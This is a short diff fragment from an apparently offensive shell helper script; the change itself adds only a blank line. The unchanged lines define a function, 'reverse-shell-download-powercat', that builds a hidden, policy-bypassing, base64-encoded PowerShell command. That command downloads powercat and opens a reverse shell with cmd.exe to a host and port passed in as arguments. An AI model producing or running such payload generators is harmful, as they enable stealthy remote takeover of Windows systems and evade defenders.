@@ -16,3 +16,4 @@ reverse-shell-download-powercat(){
 echo -n "powershell -nOp -w hIDdeN -EP ByPaSs -e ";
 echo `curl -s https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1` 'powercat -c "$1" -p $2 -e cmd.exe' | iconv -t UTF-16LE | base64 | tr -d "\n"
 }
+
